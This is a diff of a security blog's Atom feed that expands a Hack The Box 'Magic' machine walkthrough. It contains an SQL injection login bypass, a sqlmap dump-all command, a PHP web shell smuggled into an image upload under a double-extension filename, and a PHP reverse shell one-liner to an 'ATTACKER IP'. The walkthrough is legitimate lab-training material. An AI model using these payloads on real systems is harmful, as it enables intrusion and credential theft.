@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-06T22:30:42+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">InfoSecBlog</title><author><name>Abdullah Alshubaili</name></author><entry><title type="html">HTB-Magic</title><link href="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Magic.html" rel="alternate" type="text/html" title="HTB-Magic" /><published>2020-09-05T00:00:00+03:00</published><updated>2020-09-05T00:00:00+03:00</updated><id>http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Magic</id><content type="html" xml:base="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Magic.html">&lt;h1 id=&quot;brief-summary&quot;&gt;Brief Summary&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-09-07T21:18:01+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">InfoSecBlog</title><author><name>Abdullah Alshubaili</name></author><entry><title type="html">HTB-Magic</title><link href="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Magic.html" rel="alternate" type="text/html" title="HTB-Magic" /><published>2020-09-05T00:00:00+03:00</published><updated>2020-09-05T00:00:00+03:00</updated><id>http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Magic</id><content type="html" xml:base="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Magic.html">&lt;h1 id=&quot;brief-summary&quot;&gt;Brief Summary&lt;/h1&gt;
 
 &lt;p&gt;Magic Mahcine has very realistic vulerbaility, specially the one that is related to web application.&lt;/p&gt;
 
@@ -61,7 +61,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;username=admin'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;or&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'=&amp;amp;password=admin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Nice, looks like we have a different response. A redirection from the server &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP/1.1 302 Found&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Nice, looks like we have a different response. A &lt;strong&gt;redirection&lt;/strong&gt; from the server &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP/1.1 302 Found&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/magic/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;
 
@@ -72,9 +72,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;p&gt;lets grab the login HTTP request from &lt;strong&gt;Repeater&lt;/strong&gt; in &lt;strong&gt;Burp Suite&lt;/strong&gt; and save to a file.&lt;/p&gt;
 
 &lt;p&gt;start sqlmap tools with providing the following options:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-sqlmap&quot;&gt;sqlmap -r r -p username --random-agent --level 3 --batch
+&lt;pre&gt;&lt;code class=&quot;language-sqlmap&quot;&gt;sqlmap -r file --threads 10 --batch --risk 3 --level 5 --dump-all
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;while this is running, let get to the redirection part.&lt;/p&gt;
+&lt;p&gt;while this is running, let get to the &lt;strong&gt;redirection&lt;/strong&gt; part.&lt;/p&gt;
 
 &lt;p&gt;following redirection leads us to a page where upload functionality exists.&lt;/p&gt;
 
@@ -84,7 +84,124 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 &lt;p&gt;It called “Magic Number” becuase, it reads the first 4 bytes of the file. Matching it with file extenstion to determine whether to accept or refuse based on the extension and file signature that the developer hardcoded in the application.&lt;/p&gt;
 
-&lt;p&gt;Now lets try upload an image.&lt;/p&gt;</content><author><name>Abdullah Alshubaili</name></author><category term="Hack The Box" /><category term="HTB" /><category term="Magic" /><summary type="html">Brief Summary Magic Mahcine has very realistic vulerbaility, specially the one that is related to web application. Nmap First I started with nmap tool and provided the option -A. here is the result: # Nmap 7.80 scan initiated Sat May 23 01:52:13 2020 as: nmap -A -oN nmap_scan-A 10.10.10.185 Nmap scan report for 10.10.10.185 Host is up (0.16s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat May 23 01:52:44 2020 -- 1 IP address (1 host up) scanned in 30.22 seconds It looks like we have two ports open for now. Enumeration lets take a look at the application hosted on port 80 if any… if you noticed, in the bottom left corner there is a login button. Try default creds like ‘admin:admin’, but nothing worked. lets started up Burp Suite and intercept the traffic and catpure the login request. now send it to repeater. (CTRL + R) will do it. Since we have the HTTP login request lets manipulate the paremeters. In other word, lets abuse them. here is the paremeters: username=admin&amp;amp;password=admin what will happen if we send single qoute before admin word… it appears nothing changed in the response. 200 OK is the server response. lets try by adding ' or '= as this considered to be DB query. If we get different response or sql errer. Thats mostly means we have SQL Injection vulnerability. username=admin' or '=&amp;amp;password=admin Nice, looks like we have a different response. A redirection from the server HTTP/1.1 302 Found. Now we can officially say that we have SQL Injection attack. Sqli &amp;amp; More Enumeratation lets grab the login HTTP request from Repeater in Burp Suite and save to a file. start sqlmap tools with providing the following options: sqlmap -r r -p username --random-agent --level 3 --batch while this is running, let get to the redirection part. following redirection leads us to a page where upload functionality exists. first thing comes to mind is file upload restriction issues, hence the name of the machine is “Magic” and a famous technique to prevent “malicious File Upload” in development word is called “Magic Number”. Where a developer can implement “Magic Number” and chooses a specific type of files to be accepted and saved on the server. It called “Magic Number” becuase, it reads the first 4 bytes of the file. Matching it with file extenstion to determine whether to accept or refuse based on the extension and file signature that the developer hardcoded in the application. Now lets try upload an image.</summary></entry><entry><title type="html">HTB-Mango</title><link href="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Mango.html" rel="alternate" type="text/html" title="HTB-Mango" /><published>2020-09-05T00:00:00+03:00</published><updated>2020-09-05T00:00:00+03:00</updated><id>http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Mango</id><content type="html" xml:base="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Mango.html">&lt;h1 id=&quot;brief-summary&quot;&gt;Brief Summary&lt;/h1&gt;
+&lt;p&gt;Now lets try upload an image and look for the path of the uploaded image.&lt;/p&gt;
+
+&lt;p&gt;…&lt;/p&gt;
+
+&lt;p&gt;after uploading an image, i was able to see it in the landing page of the server.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/magic/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;click on the image to enlarge it. Then right click and select “copy image location”&lt;/p&gt;
+
+&lt;p&gt;my image resulted in this path: http://10.10.10.185/images/uploads/Mr9pvq9.png&lt;/p&gt;
+
+&lt;p&gt;now lets redo the same steps we did, when tried to find &lt;strong&gt;SQLI&lt;/strong&gt;. Grap the HTTP request in &lt;strong&gt;Burp Suite&lt;/strong&gt; that uploads the image to the server, and send it to The repeater.&lt;/p&gt;
+
+&lt;p&gt;playing with parameters to try to upload a shell on the server and attempt to executes by visiting the URL.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/magic/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;chaning the extenstion to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.sh&lt;/code&gt; isn’t working. But what about adding a single qoute again &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;'&lt;/code&gt; then following it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.png&lt;/code&gt; ? what could possibley happen?&lt;/p&gt;
+
+&lt;p&gt;lets praper right for exploitation. first we need to get a small good php shell, better if one liner.&lt;/p&gt;
+
+&lt;p&gt;here is a good one made by &lt;a href=&quot;https://github.com/KINGSABRI/WebShellConsole/blob/master/shells/shell.php&quot;&gt;KingSabri&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`$_GET[cmd]`&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;we can execute commands by using this parameter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?cmd=&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;now lets upload our image and stop at the request going to the server by burp.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/magic/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;keep the first line in the red sqaure and delete the rest (the first line will be different in your case).&lt;/p&gt;
+
+&lt;p&gt;by doing this, we keep the signature of the image file for the “Magic Number” to check.&lt;/p&gt;
+
+&lt;p&gt;after the first line insert the following&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`$_GET[cmd]`&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;then the name of the file should be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a.php'.jpg&lt;/code&gt;. the result should look like this..&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/magic/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;if we look at the response of this requst in burp, we find that the file has been uploaded with name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a.php'.jpg&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/magic/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;visiting the shell through this URL: 10.10.10.185/images/uploads/a.php’.jpg&lt;/p&gt;
+
+&lt;p&gt;we see some gibberish characters, which is the first line we left from the image. however, append this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?cmd=whoami&lt;/code&gt; to the end of the url –&amp;gt; 10.10.10.185/images/uploads/a.php’.jpg?cmd=whoami&lt;/p&gt;
+
+&lt;p&gt;we can see that the user is &lt;strong&gt;www-data&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;now lets look at sqlmap result then we get back to getting a reverse shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sqlmap&quot;&gt;Database: Magic
+Table: login
+[1 entry]
++----+----------+----------------+
+| id | username | password       |
++----+----------+----------------+
+| 1  | admin    | Th3s3usW4sK1ng |
++----+----------+----------------+
+
+... (screen was diplected)
+
+
+Database: information_schema
+Table: USER_PRIVILEGES
+[1 entry]
++-----------------------+--------------+---------------+----------------+
+| GRANTEE               | IS_GRANTABLE | TABLE_CATALOG | PRIVILEGE_TYPE |
++-----------------------+--------------+---------------+----------------+
+| 'theseus'@'localhost' | NO           | def           | USAGE          |
++-----------------------+--------------+---------------+----------------+
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;cool, it looks like we have some creds here and a username of the host.&lt;/p&gt;
+
+&lt;p&gt;trying ssh to the box&lt;/p&gt;
+
+&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;The authenticity of host '10.10.10.185 (10.10.10.185)' cant be established.
+ECDSA key fingerprint is SHA256:yx0Y6af8RGpG0bHr1AQtS+06uDomn1MMZVzpNaHEv0A.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.185' (ECDSA) to the list of known hosts.
+theseus@10.10.10.185: Permission denied (publickey).
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;bad luck. our machine must be in the authorized_host file in order to get ssh connection.&lt;/p&gt;
+
+&lt;p&gt;good thing is that we have a shell we upload it to the server.&lt;/p&gt;
+
+&lt;p&gt;visiting the url: 10.10.10.185/images/uploads/a.php’.jpg?cmd=whoami&lt;/p&gt;
+
+&lt;p&gt;we get a result of 404 not found ?&lt;/p&gt;
+
+&lt;p&gt;there must be somehting that deletes our uplaoded files.&lt;/p&gt;
+
+&lt;p&gt;lets redo the steps for uploading a shell and this time lets use this command&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$sock%3dfsockopen(&quot;ATTACKER IP&quot;,1234)%3bexec(&quot;/bin/sh+-i+&amp;lt;%263+&amp;gt;%263+2&amp;gt;%263&quot;)%3b'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and listen to on port 1234 with netcat.&lt;/p&gt;
+
+&lt;p&gt;good, we have a shell. first thing, upgrading our shell is always a good habit.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;second lets make use of the previous creds that were colleteced.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-xterm&quot;&gt;su - theseus
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;and supply ‘theseus’ the password that was found in the database ‘Th3s3usW4sK1ng’&lt;/p&gt;
+
+&lt;p&gt;solid, now we have compromised theseus account. lets run linux enumeration scripts like &lt;a href=&quot;https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh&quot;&gt;LinEnum.sh&lt;/a&gt;&lt;/p&gt;</content><author><name>Abdullah Alshubaili</name></author><category term="Hack The Box" /><category term="HTB" /><category term="Magic" /><summary type="html">Brief Summary Magic Mahcine has very realistic vulerbaility, specially the one that is related to web application. Nmap First I started with nmap tool and provided the option -A. here is the result: # Nmap 7.80 scan initiated Sat May 23 01:52:13 2020 as: nmap -A -oN nmap_scan-A 10.10.10.185 Nmap scan report for 10.10.10.185 Host is up (0.16s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat May 23 01:52:44 2020 -- 1 IP address (1 host up) scanned in 30.22 seconds It looks like we have two ports open for now. Enumeration lets take a look at the application hosted on port 80 if any… if you noticed, in the bottom left corner there is a login button. Try default creds like ‘admin:admin’, but nothing worked. lets started up Burp Suite and intercept the traffic and catpure the login request. now send it to repeater. (CTRL + R) will do it. Since we have the HTTP login request lets manipulate the paremeters. In other word, lets abuse them. here is the paremeters: username=admin&amp;amp;password=admin what will happen if we send single qoute before admin word… it appears nothing changed in the response. 200 OK is the server response. lets try by adding ' or '= as this considered to be DB query. If we get different response or sql errer. Thats mostly means we have SQL Injection vulnerability. username=admin' or '=&amp;amp;password=admin Nice, looks like we have a different response. A redirection from the server HTTP/1.1 302 Found. Now we can officially say that we have SQL Injection attack. Sqli &amp;amp; More Enumeratation lets grab the login HTTP request from Repeater in Burp Suite and save to a file. start sqlmap tools with providing the following options: sqlmap -r file --threads 10 --batch --risk 3 --level 5 --dump-all while this is running, let get to the redirection part. following redirection leads us to a page where upload functionality exists. first thing comes to mind is file upload restriction issues, hence the name of the machine is “Magic” and a famous technique to prevent “malicious File Upload” in development word is called “Magic Number”. Where a developer can implement “Magic Number” and chooses a specific type of files to be accepted and saved on the server. It called “Magic Number” becuase, it reads the first 4 bytes of the file. Matching it with file extenstion to determine whether to accept or refuse based on the extension and file signature that the developer hardcoded in the application. Now lets try upload an image and look for the path of the uploaded image. … after uploading an image, i was able to see it in the landing page of the server. click on the image to enlarge it. Then right click and select “copy image location” my image resulted in this path: http://10.10.10.185/images/uploads/Mr9pvq9.png now lets redo the same steps we did, when tried to find SQLI. Grap the HTTP request in Burp Suite that uploads the image to the server, and send it to The repeater. playing with parameters to try to upload a shell on the server and attempt to executes by visiting the URL. chaning the extenstion to .sh isn’t working. But what about adding a single qoute again ' then following it with .png ? what could possibley happen? lets praper right for exploitation. first we need to get a small good php shell, better if one liner. here is a good one made by KingSabri &amp;lt;?=`$_GET[cmd]`?&amp;gt; we can execute commands by using this parameter ?cmd= now lets upload our image and stop at the request going to the server by burp. keep the first line in the red sqaure and delete the rest (the first line will be different in your case). by doing this, we keep the signature of the image file for the “Magic Number” to check. after the first line insert the following &amp;lt;?=`$_GET[cmd]`?&amp;gt; then the name of the file should be a.php'.jpg. the result should look like this.. if we look at the response of this requst in burp, we find that the file has been uploaded with name a.php'.jpg visiting the shell through this URL: 10.10.10.185/images/uploads/a.php’.jpg we see some gibberish characters, which is the first line we left from the image. however, append this ?cmd=whoami to the end of the url –&amp;gt; 10.10.10.185/images/uploads/a.php’.jpg?cmd=whoami we can see that the user is www-data. now lets look at sqlmap result then we get back to getting a reverse shell. Database: Magic Table: login [1 entry] +----+----------+----------------+ | id | username | password | +----+----------+----------------+ | 1 | admin | Th3s3usW4sK1ng | +----+----------+----------------+ ... (screen was diplected) Database: information_schema Table: USER_PRIVILEGES [1 entry] +-----------------------+--------------+---------------+----------------+ | GRANTEE | IS_GRANTABLE | TABLE_CATALOG | PRIVILEGE_TYPE | +-----------------------+--------------+---------------+----------------+ | 'theseus'@'localhost' | NO | def | USAGE | +-----------------------+--------------+---------------+----------------+ cool, it looks like we have some creds here and a username of the host. trying ssh to the box The authenticity of host '10.10.10.185 (10.10.10.185)' cant be established. ECDSA key fingerprint is SHA256:yx0Y6af8RGpG0bHr1AQtS+06uDomn1MMZVzpNaHEv0A. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.185' (ECDSA) to the list of known hosts. theseus@10.10.10.185: Permission denied (publickey). bad luck. our machine must be in the authorized_host file in order to get ssh connection. good thing is that we have a shell we upload it to the server. visiting the url: 10.10.10.185/images/uploads/a.php’.jpg?cmd=whoami we get a result of 404 not found ? there must be somehting that deletes our uplaoded files. lets redo the steps for uploading a shell and this time lets use this command php -r '$sock%3dfsockopen(&quot;ATTACKER IP&quot;,1234)%3bexec(&quot;/bin/sh+-i+&amp;lt;%263+&amp;gt;%263+2&amp;gt;%263&quot;)%3b' and listen to on port 1234 with netcat. good, we have a shell. first thing, upgrading our shell is always a good habit. python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' second lets make use of the previous creds that were colleteced. su - theseus and supply ‘theseus’ the password that was found in the database ‘Th3s3usW4sK1ng’ solid, now we have compromised theseus account. lets run linux enumeration scripts like LinEnum.sh</summary></entry><entry><title type="html">HTB-Mango</title><link href="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Mango.html" rel="alternate" type="text/html" title="HTB-Mango" /><published>2020-09-05T00:00:00+03:00</published><updated>2020-09-05T00:00:00+03:00</updated><id>http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Mango</id><content type="html" xml:base="http://localhost:4000/hack%20the%20box/2020/09/05/HTB-Mango.html">&lt;h1 id=&quot;brief-summary&quot;&gt;Brief Summary&lt;/h1&gt;
 &lt;p&gt;Hello, this is my first writeup and it’s going to be about HackTheBox: Mango machine. The box is retired now which means we can talk about it publicly. I personally enjoyed playing mango machine, I learned new stuff and had fun.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/mango/machine.png&quot; alt=&quot;machine&quot; /&gt;&lt;/p&gt;
